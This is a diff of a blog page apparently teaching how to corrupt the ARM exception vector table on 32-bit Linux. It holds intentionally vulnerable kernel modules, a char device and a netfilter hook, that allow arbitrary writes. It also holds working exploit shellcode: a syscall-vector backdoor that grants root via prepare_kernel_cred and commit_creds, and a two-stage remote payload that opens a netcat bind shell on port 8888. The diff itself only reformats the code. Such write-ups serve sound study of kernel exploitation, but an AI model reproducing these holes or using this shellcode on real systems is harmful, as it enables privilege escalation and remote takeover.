@@ -166,13 +166,13 @@ gtag('config', 'G-MRPDMQ259W');
 </div>
 <h1 id="arm-exceptions-and-the-exception-vector-table">ARM Exceptions and the Exception Vector Table</h1>
 <p>In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor's "permissions" in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation: </p>
-<div class="highlight"><pre><span></span><code><span class="err"> Exception                   |       Mode            |     Description</span>
-<span class="err"> ----------------------------|-----------------------|-------------------------------------------------------------------</span>
-<span class="err"> Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.</span>
-<span class="err"> Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.</span>
-<span class="err"> Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.</span>
-<span class="err"> Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.</span>
-<span class="err"> Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.</span>
+<div class="highlight"><pre><span></span><code>Exception                   |       Mode            |     Description
+----------------------------|-----------------------|-------------------------------------------------------------------
+Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
+Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
+Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
+Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
+Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
 </code></pre></div>
 
 
@@ -182,16 +182,16 @@ gtag('config', 'G-MRPDMQ259W');
 <p><center><img alt="Banked Registers" src="/images/corrupting_arm_evt/banked_regs.png"></center>  </p>
 <h2 id="the-exception-vector-table">The Exception Vector Table</h2>
 <p>The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is <strong>0xffff0000</strong>. Each entry in the EVT is also at a known offset as can be seen on the following table:</p>
-<div class="highlight"><pre><span></span><code><span class="err"> Exception                   |       Address            </span>
-<span class="err"> ----------------------------|-----------------------</span>
-<span class="err"> Reset                       |      0xffff0000           </span>
-<span class="err"> Undefined Instruction       |      0xffff0004       </span>
-<span class="err"> SWI                         |      0xffff0008  </span>
-<span class="err"> Prefetch Abort              |      0xffff000c       </span>
-<span class="err"> Data Abort                  |      0xffff0010 </span>
-<span class="err"> Reserved                    |      0xffff0014  </span>
-<span class="err"> IRQ                         |      0xffff0018   </span>
-<span class="err"> FIQ                         |      0xffff001c</span>
+<div class="highlight"><pre><span></span><code>Exception                   |       Address            
+----------------------------|-----------------------
+Reset                       |      0xffff0000           
+Undefined Instruction       |      0xffff0004       
+SWI                         |      0xffff0008  
+Prefetch Abort              |      0xffff000c       
+Data Abort                  |      0xffff0010 
+Reserved                    |      0xffff0014  
+IRQ                         |      0xffff0018   
+FIQ                         |      0xffff001c  
 </code></pre></div>
 
 
@@ -202,24 +202,24 @@ gtag('config', 'G-MRPDMQ259W');
 <p>There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let's try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let's now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.</p>
 <h2 id="local-scenario">Local scenario</h2>
 <p>The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):</p>
-<div class="highlight"><pre><span></span><code>    <span class="c1">// called when &#39;write&#39; system call is done on the device file</span>
-    <span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
-        <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-        <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><span class="c1">// called when &#39;write&#39; system call is done on the device file</span>
+<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 
-        <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
-            <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
-        <span class="k">else</span>
-            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
+        <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
+    <span class="k">else</span>
+        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
 
-        <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
-        <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
+    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
 
-    <span class="nl">end</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
-    <span class="p">}</span>
+<span class="nl">end</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 
@@ -235,24 +235,24 @@ It looks like nothing is there so we have around 480 bytes to store our backdoor
     2. Overwrite the SWI exception vector with a branch to <em>0xffff0020</em>.<br>
     3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.<br>
 Here is the backdoor's code:</p>
-<div class="highlight"><pre><span></span><code>    ;check if magic
-        cmp     r7, #0xb0000000
-        bne     exit
+<div class="highlight"><pre><span></span><code>;check if magic
+    cmp     r7, #0xb0000000
+    bne     exit
 
-    elevate:
-        stmfd   sp!,{r0-r12}
+elevate:
+    stmfd   sp!,{r0-r12}
 
-        mov     r0, #0
-        ldr     r3, =0xc0049a00     ;prepare_kernel_cred
-        blx     r3
-        ldr     r4, =0xc0049438     ;commit_creds
-        blx     r4
+    mov     r0, #0
+    ldr     r3, =0xc0049a00     ;prepare_kernel_cred
+    blx     r3
+    ldr     r4, =0xc0049438     ;commit_creds
+    blx     r4
 
-        ldmfd   sp!, {r0-r12, pc}^  ;return to userland
+    ldmfd   sp!, {r0-r12, pc}^  ;return to userland
 
-    ;go to syscall handler
-    exit:
-        ldr     pc, [pc, #980]      ;go to normal swi handler
+;go to syscall handler
+exit:
+    ldr     pc, [pc, #980]      ;go to normal swi handler
 </code></pre></div>
 
 
@@ -260,17 +260,17 @@ Here is the backdoor's code:</p>
 <center><img alt="Local PoC" src="/images/corrupting_arm_evt/local_poc.png"></center>  </p>
 <h2 id="remote-scenario">Remote scenario</h2>
 <p>For this example, we will use a netfilter module with a similar vulnerability as the previous one:</p>
-<div class="highlight"><pre><span></span><code>        <span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
-            <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
-            <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">);</span>
-            <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
-                <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
-                <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
-                <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
-                <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
-                <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
+    <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
+    <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
+        <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
+        <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
 
@@ -285,48 +285,48 @@ Every system call goes through the SWI vector so we won't have to wait too much 
     3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.<br>
     4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  </p>
 <p>Here is the stage 1-2 shellcode:</p>
-<div class="highlight"><pre><span></span><code>    stage_1:
-        adr     lr, stage_2
-        push    {lr}
-        stmfd   sp!, {r0-r12}
-        ldr     r0, =0xe59ff410     ; intial value at 0xffff0008 which is
-                                    ; ldr     pc, [pc, #1040] ; 0xffff0420
-        ldr     r1, =0xffff0008
-        str     r0, [r1]
-        ldmfd   sp!, {r0-r12, pc}^  ; return to userland
+<div class="highlight"><pre><span></span><code>stage_1:
+    adr     lr, stage_2
+    push    {lr}
+    stmfd   sp!, {r0-r12}
+    ldr     r0, =0xe59ff410     ; intial value at 0xffff0008 which is
+                                ; ldr     pc, [pc, #1040] ; 0xffff0420
+    ldr     r1, =0xffff0008
+    str     r0, [r1]
+    ldmfd   sp!, {r0-r12, pc}^  ; return to userland
 
-    stage_2:
-        ldr     r0, =0x6e69622f     ; /bin
-        ldr     r1, =0x68732f2f     ; /sh
-        eor     r2, r2, r2          ; 0x00000000
-        push    {r0, r1, r2}
-        mov     r0, sp
+stage_2:
+    ldr     r0, =0x6e69622f     ; /bin
+    ldr     r1, =0x68732f2f     ; /sh
+    eor     r2, r2, r2          ; 0x00000000
+    push    {r0, r1, r2}
+    mov     r0, sp
 
-        ldr     r4, =0x0000632d     ; -c\x00\x00
-        push    {r4}
-        mov     r4, sp
+    ldr     r4, =0x0000632d     ; -c\x00\x00
+    push    {r4}
+    mov     r4, sp
 
-        ldr     r5, =0x2d20636e
-        ldr     r6, =0x3820706c
-        ldr     r7, =0x20383838     ; nc -lp 8888 -e /bin//sh
-        ldr     r8, =0x2f20652d
-        ldr     r9, =0x2f6e6962
-        ldr     r10, =0x68732f2f
+    ldr     r5, =0x2d20636e
+    ldr     r6, =0x3820706c
+    ldr     r7, =0x20383838     ; nc -lp 8888 -e /bin//sh
+    ldr     r8, =0x2f20652d
+    ldr     r9, =0x2f6e6962
+    ldr     r10, =0x68732f2f
 
-        eor     r11, r11, r11
-        push    {r5-r11}
-        mov     r5, sp
-        push    {r2}
+    eor     r11, r11, r11
+    push    {r5-r11}
+    mov     r5, sp
+    push    {r2}
 
-        eor     r6, r6, r6
-        push    {r0,r4,r5, r6}
-        mov     r1, sp
-        mov     r7, #11
-        swi     0x0
+    eor     r6, r6, r6
+    push    {r0,r4,r5, r6}
+    mov     r1, sp
+    mov     r7, #11
+    swi     0x0
 
-        mov     r0, #99
-        mov     r7, #1
-        swi     0x0
+    mov     r0, #99
+    mov     r7, #1
+    swi     0x0
 </code></pre></div>
 
 
